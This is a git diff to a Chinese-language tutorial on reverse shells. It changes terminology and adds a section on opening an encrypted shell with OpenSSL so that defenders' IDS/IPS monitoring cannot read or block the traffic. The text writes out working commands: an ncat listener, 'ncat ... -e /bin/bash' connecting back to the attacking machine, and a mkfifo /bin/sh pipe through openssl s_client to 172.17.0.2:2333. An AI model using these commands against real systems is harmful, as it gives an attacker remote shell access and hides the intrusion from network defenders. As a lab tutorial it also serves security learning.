@@ -8,8 +8,8 @@
 apt install ncat
 ```
 
-起的两个ubuntu上，一个作为attacker，一个作为victim。
-其中在attacker上输入：
+起的两个ubuntu上，一个作为攻击机，一个作为目标机。
+其中在攻击机上输入：
 ```shell
 ncat -lvvp 2333
 ```
@@ -19,12 +19,12 @@ ncat -lvvp 2333
 ```shell
 ncat 172.17.0.2 2333 -e /bin/bash
 ```
-没有bash用sh，ncat后跟的是attacker的ip和监听的端口
+没有bash用sh，ncat后跟的是攻击机的ip和监听的端口
 
-随后在attacker上即可反弹shell，效果如下
+随后在攻击机上即可反弹shell，效果如下
 
 ![](netcat_reverse_shell.png)
-可以看到，在victim上执行了ncat操作，反弹shell到attacker，其中
+可以看到，在目标机上执行了ncat操作，反弹shell到攻击机，其中
 ```shell
 ls
 ```
@@ -32,7 +32,7 @@ ls
 
 ### 2. 利用telnet弹shell
 
-与netcat上类似，在攻击机上开启端口监听：
+与ncat上类似，在攻击机上开启端口监听：
 ```shell
 ncat -lvvp 2333
 ```
@@ -109,4 +109,35 @@ python3 -c "import pty;pty.spawn('/bin/bash')"
 可以看到，终端id和目标机的也一样，ip等其他的也一样。
 
 ### 5. 通过OpenSSL反弹加密shell
+
+在上文我们总结了很多反弹shell得方法，但是这些reverse-shell的方式都有一个缺点，那就是所有的流量都是明文传输的。
+这些通过shell通过传输的流量都可以被管理员直接抓取并理解，当目标主机网络环境存在网络防御检测系统时(IDS、IPS等)，网络防御检测系统会获取到我们的通信内容并进行告警和阻止。
+因此，我们需要对通信的内容进行混淆或加密，这时可以选择使用 OpenSSL 反弹一个加密的 shell。
+
+首先，在攻击机和目标机上都去生成一个自签名证书
+```shell
+openssl req -x509 -newkey rsa:2048 -keyout key.pem -out cert.pem -days 365 -nodes
+```
+![img.png](self_signed_certificate.png)
+一路回车即可
+
+然后在攻击机上开启端口监听(这里不再使用ncat)
+```shell
+openssl s_server -quiet -key key.pem -cert cert.pem -port 2333
+```
+此时OpenSSL就在攻击机上开启了一个SSL/TLS的2333端口的server
+
+之后，在目标机上进行reverse_shell：
+```shell
+mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 172.17.0.2:2333 > /tmp/s; rm /tmp/s
+```
+![img.png](reverse_shell_via_ssl.png)
+这样便在攻击机上通过OpenSSL反弹了了一个目标机的一个加密shell。
+
+
+
+
+#### 参考资料
+https://drun1baby.github.io/2022/07/20/%E5%8F%8D%E5%BC%B9shell%E5%AD%A6%E4%B9%A0/
+
 
